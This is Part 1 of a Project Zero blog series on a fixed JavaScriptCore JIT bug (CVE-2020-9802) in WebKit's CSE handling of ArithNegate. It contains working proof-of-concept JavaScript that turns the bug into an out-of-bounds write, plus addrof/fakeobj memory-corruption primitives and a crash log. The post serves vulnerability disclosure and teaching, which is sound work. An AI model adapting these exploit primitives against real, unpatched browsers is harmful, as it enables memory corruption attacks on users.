---
source: p0
source_url: https://projectzero.google/2020/09/jitsploitation-one.html
title: "JITSploitation I: A JIT Bug - Project Zero"
description: "By Samuel Groß, Project ZeroThis three-part series highlights the technical challenges involved i..."
---

By Samuel Groß, Project Zero

This three-part series highlights the technical challenges involved in finding and exploiting JavaScript engine vulnerabilities in modern web browsers and evaluates current exploit mitigation technologies. The exploited vulnerability, CVE-2020-9802, was fixed in iOS 13.5, while two of the mitigation bypasses, CVE-2020-9870 and CVE-2020-9910, were fixed in iOS 13.6.

==========

How might a browser renderer exploit look like in 2020? I set out to answer that question in January this year. Since it’s one of my favorite areas in computer science, I wanted to find a JIT compiler vulnerability, and I was especially interested in trying to find (new) types of vulnerabilities that [my fuzzer](https://github.com/googleprojectzero/fuzzilli) would have a hard time finding.

As WebKit (on iOS and likely soon on ARM-powered macOS) arguably features the most sophisticated exploit mitigations at present, including hardware supported mitigations like [PAC](https://support.apple.com/guide/security/pointer-authentication-codes-seca5759bf02/web) and [APRR](https://siguza.github.io/APRR/), it seemed fitting to focus on WebKit, or in fact JavaScriptCore (JSC), its JavaScript engine.

This blog post series will:

- Provide a short introduction to JIT engines and in particular the Common-Subexpression Elimination (CSE) optimization


- Explain a JIT compiler vulnerability - [CVE-2020-9802](https://bugs.chromium.org/p/project-zero/issues/detail?id=2020) \- stemming from incorrect CSE and how it can be exploited for an out-of-bounds read or write on the JSC heap

- Provide an in depth discussion of WebKit’s renderer exploit mitigations on iOS, in particular: StructureID randomization, the Gigacage, Pointer Authentication (PAC) and JIT Hardening on top of APRR (essentially per-thread page permissions), how they work, potential weaknesses, and how they were bypassed during exploit development


The proof of concept exploit code accompanying this blog post series can be found [here](https://bugs.chromium.org/p/project-zero/issues/detail?id=2020#c4). It was tested against Mobile Safari on iOS 13.4.1 and Safari 13.1 on macOS 10.15.4.

This series strives to be understandable for security researchers and engineers without strong backgrounds in browser exploitation. It also attempts to explain the various JIT compilation mechanisms used (and abused) for exploit development. However, it should be noted that JIT compilers are likely among the most complex attack surfaces of a web browser (and that the exploited vulnerability is likely particularly complex), and are thus not particularly beginner friendly. On the other hand, the vulnerabilities found therein are also frequently among the most powerful ones, with a good chance to stay exploitable for quite some time to come.

## Introduction

As there are by now [many good public](https://ponyfoo.com/articles/an-introduction-to-speculative-optimization-in-v8) [resources on JIT compilers](https://webkit.org/blog/10308/speculation-in-javascriptcore/), this section only provides a brief 2 minute introduction/refresher to JavaScript JITing.

Take the following JavaScript code:

function foo(o, y) {

    let x = o.x;

    return x + y;

}

for (let i = 0; i < 10000; i++) {

    foo({x: i}, 42);

}

As JIT compilation is costly, it is only performed for code that is repeatedly executed. As such, the function foo will execute inside the interpreter (or a cheap “baseline” JIT) for some time. During that time, value profiles will be collected, which, for foo, would look something like this:

- o: JSObject with a property .x at offset 16

- x: Int32

- y: Int32


Later, when the optimizing JIT compiler eventually kicks in, it starts by translating the JavaScript source code (or, more likely the interpreter bytecode) into the JIT compiler’s own intermediate code representation. In the [DFG](https://github.com/WebKit/webkit/tree/master/Source/JavaScriptCore/dfg), JavaScriptCore’s optimizing JIT compiler, this is done by the [DFGByteCodeParser](https://github.com/WebKit/webkit/blob/master/Source/JavaScriptCore/dfg/DFGByteCodeParser.cpp).

The function foo in DFG IR might initially look something like this:

v0 = GetById o, .x

v1 = ValueAdd v0, y

Return v1

Here, GetById and ValueAdd are fairly generic (or high-level) operations, capable of handling different input types (e.g. ValueAdd would also be able to concatenate strings).

Next, the JIT compiler inspects the value profiles and, based on them, will speculate that similar input types will be used in the future. Here, it would speculate that o would always be a certain kind of JSObject and x and y Int32s. However, as there is no guarantee the speculations will always be true, the compiler has to guard the speculations, typically with cheap runtime type checks:

CheckType o, “Object with property .x at offset 16”

CheckType y, Int32

v0 = GetByOffset o, 16

CheckType v0, Int32

v1 = ArithAdd v0, y

Return v1

Also note how the GetById and ValueAdd have been specialized to the more efficient (and less generic) GetByOffset and ArithAdd operations. In DFG, this speculative optimization happens in multiple places, [for example, already in DFGByteCodeParser](https://github.com/WebKit/webkit/blob/d66fd3786d65b41f8b607269d048fdb143fbfeca/Source/JavaScriptCore/dfg/DFGByteCodeParser.cpp#L4471).

At this point, the IR code is essentially typed as the speculation guards allow type inference. Next, numerous code optimizations are performed, such as loop-invariant code motion or constant folding. An overview of the optimizations done by DFG can be extracted from [DFGPlan](https://github.com/WebKit/webkit/blob/0f0dc120efaba5da477f725ef698ee51d0f16b1f/Source/JavaScriptCore/dfg/DFGPlan.cpp#L239).

Finally, the now-optimized IR is lowered to machine code. In DFG this is done directly by the [DFGSpeculativeJIT](https://github.com/WebKit/webkit/blob/master/Source/JavaScriptCore/dfg/DFGSpeculativeJIT.cpp) while in [FTL](https://trac.webkit.org/wiki/FTLJIT) mode the DFG IR is [first lowered to B3](https://github.com/WebKit/webkit/blob/master/Source/JavaScriptCore/ftl/FTLLowerDFGToB3.cpp), another IR, which undergoes further optimizations before itself being [lowered to machine code](https://github.com/WebKit/webkit/blob/master/Source/JavaScriptCore/b3/B3Compile.cpp).

Next up, a specific optimization Common-Subexpression Elimination (CSE) is discussed.

## Common-Subexpression Elimination (CSE)

The idea behind this optimization is to detect duplicate computations (or expressions) and to merge them into a single computation. As an example, consider the following JavaScript code:

    let c = Math.sqrt(a\*a + a\*a);

Assume further that a and b are known to be [primitive values](https://www.ecma-international.org/ecma-262/10.0/index.html#sec-ecmascript-overview) (e.g. Numbers), then a JavaScript JIT compiler can convert the code to the following:

let tmp = a\*a;

let c = Math.sqrt(tmp + tmp);

And by doing so save one ArithMul operation at runtime. This optimization is called Common Subexpression Elimination (CSE).

Now, take the following JavaScript code instead:

let c = o.a;

f();

let d = o.a;

Here, the compiler can not eliminate the second property load operation during CSE as the function call in between could have changed the value of the .a property.

In JSC, the modelling of whether an operation can be subject to CSE (and under which circumstances) is done in DFGClobberize. For ArithMul, [DFGClobberize states](https://github.com/WebKit/webkit/blob/4a1c8cf6db8dd033362305fc2f861f6e36c0bd14/Source/JavaScriptCore/dfg/DFGClobberize.h#L427):

    case ArithMul:

        switch (node->binaryUseKind()) {

        case Int32Use:

        case Int52RepUse:

        case DoubleRepUse:

def(PureValue(node, node->arithMode()));

            return;

        case UntypedUse:

            clobberTop();

            return;

        default:

            DFG\_CRASH(graph, node, "Bad use kind");

        }

The def() of the PureValue here expresses that the computation does not rely on any context and thus that it will always yield the same result when given the same inputs. However, note that the PureValue is [parameterized](https://github.com/WebKit/webkit/blob/88e37615aef2192e184012bf25d8acfa0710c12c/Source/JavaScriptCore/dfg/DFGPureValue.h#L61) by the [ArithMode](https://github.com/WebKit/webkit/blob/88e37615aef2192e184012bf25d8acfa0710c12c/Source/JavaScriptCore/dfg/DFGArithMode.h#L41) of the operation, which specifies whether the operation should handle (e.g. by bailing out to the interpreter) integer overflows or not. The parameterization in this case prevents two ArithMul operations with different handling of integer overflows from being substituted for each other. An operation that handles overflows is also commonly referred to as a “checked” operation, and an “unchecked” operation is one that does not detect or handle overflows.

In contrast, for GetByOffset (which can be used for the property load), [DFGClobberize contains](https://github.com/WebKit/webkit/blob/4a1c8cf6db8dd033362305fc2f861f6e36c0bd14/Source/JavaScriptCore/dfg/DFGClobberize.h#L1273):

case GetByOffset:

       unsigned identifierNumber = node->storageAccessData().identifierNumber;

       AbstractHeap heap(NamedProperties, identifierNumber);

       read(heap);

       def(HeapLocation(NamedPropertyLoc, heap, node->child2()), LazyNode(node));

This in essence says that the value produced by this operation depends on the NamedProperty " [abstract heap](https://github.com/WebKit/webkit/blob/master/Source/JavaScriptCore/dfg/DFGAbstractHeap.h)". As such, eliminating a second GetByOffset is only sound if there are no writes to the NamedProperties abstract heap (i.e. to memory locations containing property values) between the two GetByOffset operations.

## The Bug

[DFGClobberize did not take the ArithMode of the ArithNegate operation into account](https://github.com/WebKit/webkit/blob/2aabe9466e5be21468dcf84092e2ddff0d4e17a7/Source/JavaScriptCore/dfg/DFGClobberize.h#L251):

    case ArithNegate:

        if (node->child1().useKind() == Int32Use \|\| ...)

            def(PureValue(node));          // <- only the input matters, not the ArithMode

This could cause CSE to substitute a checked ArithNegate with an unchecked one. In the case of ArithNegate (a negation of a 32bit integer), an integer overflow can only occur in one specific situation: when negating INT\_MIN: -2147483648. This is because 2147483648 is not representable as a 32 bit signed integer, and so -INT\_MIN causes an integer overflow and again results in INT\_MIN.

The bug was found by studying the CSE defs in DFGClobberize, thinking about why some PureValues (and which ones) needed to be parameterized with the ArithMode, then searching for cases where that parameterization was missing.

The [patch](https://github.com/WebKit/webkit/commit/951d27d5ba08b6c29370b05dc6b4ffe18be1ca18) for this bug is very simple:

-            def(PureValue(node));

+            def(PureValue(node, node->arithMode()));

This now teaches CSE to take the arithMode (unchecked or checked) of an ArithNegate operation into account. As such, two ArithNegate operations with different modes can no longer be substituted for each other.

In addition to ArithNegate, DFGClobberize also missed the ArithMode for the ArithAbs operation.

Note that this type of bug is likely very hard to detect through fuzzing as

- the fuzzer would need to create two ArithNegate operations on the same inputs but with a different ArithMode,

- the fuzzer would need to trigger the case where the difference in the ArithMode matters, which in this case means it would need to negate the value INT\_MIN, and,

- unless the engine has custom “sanitizers” for detecting these types of issues early on and unless differential fuzzing is done, the fuzzer would then somehow still need to turn this condition into a memory safety violation or an assertion failure. As is shown in the next section, this step is likely the hardest and extremely unlikely to happen by chance


## Achieving Out-Of-Bounds

The JavaScript function shown below achieves out-of-bounds access by an arbitrary index (in this case 7) into a JSArray through this bug:

function hax(arr, n) {

    n \|= 0;

    if (n < 0) {

        let v = (-n)\|0;

        let i = Math.abs(n);

        if (i < arr.length) {

            if (i & 0x80000000) {

                i += -0x7ffffff9;

            }

            if (i > 0) {

                arr\[i\] = 1.04380972981885e-310;

            }

        }

    }

}

The following is a step-by-step explanation of how this PoC was constructed. At the end of this section there is also a commented version of the above function.

First of all, ArithNegate is only used to negate integers (the more generic ValueNegate operation can negate all JavaScript values), but in the [JavaScript specification Numbers are generally floating point values](https://www.ecma-international.org/ecma-262/10.0/index.html#sec-ecmascript-language-types-number-type). As such it is necessary to “hint” to the compiler that the input value will always be integer. This is easily accomplished by first performing a bitwise operation, [which will always result in 32-bit signed integer values](https://www.ecma-international.org/ecma-262/10.0/index.html#sec-binary-bitwise-operators-runtime-semantics-evaluation):

    n = n\|0; // n will be an integer value now

With that, it is now possible to construct an unchecked ArithNegate operation (with which a checked one will later be CSE’d):

    n = n\|0;

    let v = (-n)\|0;

Here, during the DFGFixupPhase, the negation of n will be [converted to an unchecked ArithNeg operation](https://github.com/WebKit/webkit/blob/4ceb36e525b55b9d49aed0b400507d522953e025/Source/JavaScriptCore/dfg/DFGFixupPhase.cpp#L462). The compiler is able to omit the overflow check as the only use of the negated value is the bitwise or, and that behaves the same for the overflowed and “correct” value:

js> -2147483648 \| 0

-2147483648

js> 2147483648 \| 0

-2147483648

Next, it is necessary to construct a checked ArithNegate operation with n as its input. One interesting (why will become clear in a bit) way to obtain an ArithNegate is by having the compiler [strength-reduce](https://en.wikipedia.org/wiki/Strength_reduction) an [ArithAbs operation into an ArithNegate operation](https://github.com/WebKit/webkit/blob/4ceb36e525b55b9d49aed0b400507d522953e025/Source/JavaScriptCore/dfg/DFGIntegerRangeOptimizationPhase.cpp#L1264). This will only happen if the compiler can prove that n will be a negative number, which can easily be accomplished as DFG’s IntegerRangeOptimization pass is [path-sensitive](https://github.com/WebKit/webkit/blob/4ceb36e525b55b9d49aed0b400507d522953e025/Source/JavaScriptCore/dfg/DFGIntegerRangeOptimizationPhase.cpp#L1124):

n = n\|0;

if (n < 0) {

    // Compiler knows that n will be a negative integer here

    let v = (-n)\|0;

    let i = Math.abs(n);

}

Here, during bytecode parsing, the call to Math.abs will first be [lowered to an ArithAbs operation](https://github.com/WebKit/webkit/blob/4ceb36e525b55b9d49aed0b400507d522953e025/Source/JavaScriptCore/dfg/DFGByteCodeParser.cpp#L2324) because the compiler is able to prove that the call will always result in the execution of the [mathAbs](https://github.com/WebKit/webkit/blob/4ceb36e525b55b9d49aed0b400507d522953e025/Source/JavaScriptCore/runtime/MathObject.cpp#L130) function and so replaces it with the ArithAbs operation, which has the same runtime semantics but doesn’t require a function call at runtime. The compiler is in essence inlining Math.abs that way. Later, the IntegerRangeOptimization will [convert the ArithAbs to a checked ArithNegate](https://github.com/WebKit/webkit/blob/4ceb36e525b55b9d49aed0b400507d522953e025/Source/JavaScriptCore/dfg/DFGIntegerRangeOptimizationPhase.cpp#L1264) (the ArithNegate must be checked as INT\_MIN can’t be ruled out for n). As such, the two statements inside the if statement become essentially (in pseudo DFG IR):

v = ArithNeg(unchecked) n

i = ArithNeg(checked) n

Which, due to the bug, CSE will later turn into

v = ArithNeg(unchecked) n

i = v

At this point, calling the miscompiled function with INT\_MIN for n will cause i to also be INT\_MIN, even though it really should be a positive number.

This by itself is a correctness issue, but not yet a security issue. One (and possibly the only) way to turn this bug into a security issue is by abusing a JIT optimization already popular among security researchers: bounds-check elimination.

Going back to the IntegerRangeOptimization pass, the [value of i was already marked as being a positive number](https://github.com/WebKit/webkit/blob/4ceb36e525b55b9d49aed0b400507d522953e025/Source/JavaScriptCore/dfg/DFGIntegerRangeOptimizationPhase.cpp#L1392). For [bounds check elimination to happen](https://github.com/WebKit/webkit/blob/4ceb36e525b55b9d49aed0b400507d522953e025/Source/JavaScriptCore/dfg/DFGIntegerRangeOptimizationPhase.cpp#L1338), however, the value must also be known to be less than the length of the array being indexed. This is easily accomplished:

function hax(arr, n) {

n = n\|0;

if (n < 0) {

    let v = (-n)\|0;

    let i = Math.abs(n);

if (i < arr.length) {

        arr\[i\];

    }

}

}

When now triggering the bug, i will be INT\_MIN and will thus pass the comparison and perform the array access. However, the bounds check will have been removed as IntegerRangeOptimization has falsely (although it’s technically not its fault) determined i to always be in bounds.

Before the bug can be triggered, the JavaScript code has to be JIT compiled. This is generally achieved simply by executing the code a large number of times. However, the indexed access into arr will only be lowered ( [by the SSALoweringPhase](https://github.com/WebKit/webkit/blob/3e4dab3947ebf4e7fc854e674b9e93c71849e9d8/Source/JavaScriptCore/dfg/DFGSSALoweringPhase.cpp#L113)) to a CheckInBounds (that will later be removed) and an un-bounds-checked GetByVal if the [access is speculated to be in bounds](https://github.com/WebKit/webkit/blob/087b310bd4dd3d68cff76bff8798cf60ddef1f7d/Source/JavaScriptCore/dfg/DFGArrayMode.cpp#L817). This will not be the case if the access has frequently been observed to be out-of-bounds during interpretation or execution in baseline JIT. As such, during “training” of the function it is necessary to use sane, in-bounds indices:

    for (let i = 1; i <= ITERATIONS; i++) {

        let n = -4;

        if (i == ITERATIONS) {

            n = -2147483648;        // INT\_MIN

        }

        hax(arr, n);

    }

Running this code inside JSC will crash:

lldb -- /System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc poc.js

(lldb) r

Process 12237 stopped

\\* thread #1, queue = 'com.apple.main-thread', stop reason = EXC\_BAD\_ACCESS (code=1, address=0x1c1fc61348)

       frame #0: 0x000051fcfaa06f2e

   ->  0x51fcfaa06f2e: movsd  xmm0, qword ptr \[rax + 8\*rcx\] ; xmm0 = mem\[0\],zero

Target 0: (jsc) stopped.

(lldb) reg read rcx

        rcx = 0x0000000080000000

However, inconveniently, the out-of-bounds index (in rcx) will always be INT\_MIN, thus accessing 0x80000000 \* 8 = 16GB behind the array. While probably exploitable, it’s not exactly the best exploit primitive to start from.

The final trick to achieve an OOB access with an arbitrary index is to subtract a constant from i which will wrap INT\_MIN around to an arbitrary, positive number. As i is thought (by the DFG compiler) to always be positive, the subtraction [will become unchecked](https://github.com/WebKit/webkit/blob/4ceb36e525b55b9d49aed0b400507d522953e025/Source/JavaScriptCore/dfg/DFGIntegerRangeOptimizationPhase.cpp#L1308) and the overflow will thus go unnoticed.

However, as the subtraction invalidates integer range information about the lower bound, an additional \`if i > 0\` check is required afterwards to again trigger bounds check removal. Also, as the subtraction would turn the integers used during training into out-of-bounds indices, it is only executed conditionally if the input value is negative. Fortunately, the DFG compiler isn’t (yet) clever enough to determine that that condition should never be true in which case it could just optimize away the subtraction entirely :)

With all of that, shown below is again the function from the start, however this time with comments. When JITed and given INT\_MIN for n it causes an out-of-bounds write of a controlled value (0x0000133700001337) into the [length fields](https://github.com/WebKit/webkit/blob/4ceb36e525b55b9d49aed0b400507d522953e025/Source/JavaScriptCore/runtime/IndexingHeader.h#L130) of a JSArray directly following arr in memory. Note that the success of this step depends on the correct heap layout. However, as the bug is powerful enough to be exploited for a controlled OOB read as well, it is possible to ensure the correct heap layout is present before triggering the memory corruption.

function hax(arr, n) {

    // Force n to be a 32bit integer.

    n \|= 0;

    // Let IntegerRangeOptimization know that

    // n will be a negative number inside the body.

    if (n < 0) {

        // Force "non-number bytecode usage" so the negation

        // becomes unchecked and as such INT\_MIN will again

        // become INT\_MIN in the last iteration.

        let v = (-n)\|0;

        // As n is known to be negative here, this ArithAbs

        // will become a ArithNegate. That negation will be

        // checked, but then be CSE'd for the previous,

        // unchecked one. This is the compiler bug.

        let i = Math.abs(n);

        // However, IntegerRangeOptimization has also marked

        // i as being >= 0...

        if (i < arr.length) {

            // .. so here IntegerRangeOptimization now believes

            // i will be in the range \[0, arr.length) while i\
\
            // will actually be INT\_MIN in the final iteration.\
\
            // This condition is written this way so integer\
\
            // range optimization isn't able to propagate range\
\
            // information (in particular that i must be a\
\
            // negative integer) into the body.\
\
            if (i & 0x80000000) {\
\
                // In the last iteration, this will turn INT\_MIN\
\
                // into an arbitrary, positive number since the\
\
                // ArithAdd has been made unchecked by integer range\
\
                // optimization (as it believes i to be a positive\
\
                // number) and so doesn't bail out when overflowing\
\
                // int32.\
\
                i += -0x7ffffff9;\
\
            }\
\
            // This conditional branch is now necessary due to\
\
            // the subtraction above. Otherwise,\
\
            // IntegerRangeOptimization couldn’t prove that i\
\
            // was always positive.\
\
            if (i > 0) {\
\
                // In here, IntegerRangeOptimization again believes\
\
                // i to be in the range \[0, arr.length) and thus\
\
                // eliminates the CheckBounds node, leading to a\
\
                // controlled OOB access. This write will then corrupt\
\
                // the header of the following JSArray, setting its\
\
                // length and capacity to 0x1337.\
\
                arr\[i\] = 1.04380972981885e-310;\
\
            }\
\
        }\
\
    }\
\
}\
\
## Addrof/Fakeobj\
\
At this point, the two [low-level exploit primitives addrof and fakeobj](http://www.phrack.org/papers/attacking_javascript_engines.html) can be constructed. The addrof(obj) primitive returns the address (as double) of the given JavaScript object in memory:\
\
    let obj = {a: 42};\
\
    let addr = addrof(obj);\
\
    // 2.211548541e-314 (0x000000010acdc250 as 64bit integer)\
\
The fakeobj(addr) primitive returns a JSValue containing the given address as payload:\
\
    let obj2 = fakeobj(addr);\
\
    obj2 === obj;\
\
    // true\
\
These primitives are useful as they basically allow two things: breaking heap ASLR so that controlled data can be placed at a known address and providing a way to construct and “inject” fake objects into the engine. But more on exploitation in [part 2](https://projectzero.google/2020/09/jitsploitation-two.html).\
\
The two primitives can be constructed with two JSArrays with [different storage types](https://liveoverflow.com/revisiting-javascriptcore-internals-boxed-vs-unboxed-browser-0x06/): by overlapping a JSArray which stores (unboxed/raw) doubles with a JSArray that stores JSValues ( [boxed/tagged values](https://github.com/WebKit/webkit/blob/4ceb36e525b55b9d49aed0b400507d522953e025/Source/JavaScriptCore/runtime/JSCJSValue.h#L382) that can for example be pointers to JSObjects):\
\
[![Image: An arrangement of two adjacent JSArray objects in memory](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5WbY_s1200_image1%2812%29.png)](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5WbY_s1282_image1%2812%29.png)\
\
This then allows reading/writing pointer values in obj\_arr as doubles through float\_arr:\
\
    let noCoW = 13.37;\
\
    let target = \[noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6\];\
\
    let float\_arr = \[noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6\];\
\
    let obj\_arr = \[{}, {}, {}, {}, {}, {}, {}\];\
\
    // Trigger the bug to write past the end of the target array and\
\
    // thus corrupting the length of the float\_arr following it\
\
    hax(target, n);\
\
    assert(float\_arr.length == 0x1337);\
\
    // (OOB) index into float\_arr that overlaps with the first element\
\
    // of obj\_arr.\
\
    const OVERLAP\_IDX = 8;\
\
    function addrof(obj) {\
\
        obj\_arr\[0\] = obj;\
\
        return float\_arr\[OVERLAP\_IDX\];\
\
    }\
\
    function fakeobj(addr) {\
\
        float\_arr\[OVERLAP\_IDX\] = addr;\
\
        return obj\_arr\[0\];\
\
    }\
\
Note the somewhat unintuitive use of the noCoW variable. It is used to prevent JSC from [allocating the arrays as copy-on-write arrays](https://github.com/WebKit/webkit/blob/4ceb36e525b55b9d49aed0b400507d522953e025/Source/JavaScriptCore/bytecompiler/NodesCodegen.cpp#L423), which would otherwise result in the wrong heap layout.\
\
## Conclusion\
\
I hope this was already an interesting walkthrough of a “non-standard” JIT compiler bug. Please keep in mind that there are many (JIT) vulnerabilities that are much easier to exploit. On the other hand, the fact that exploitation (up to this point) wasn’t trivial also allowed touching on numerous JSC and JIT compiler internals along the way.\
\
[Part 2](https://projectzero.google/2020/09/jitsploitation-two.html) will show different ways of achieving an arbitrary read/write primitive from the addrof and fakeobj primitives.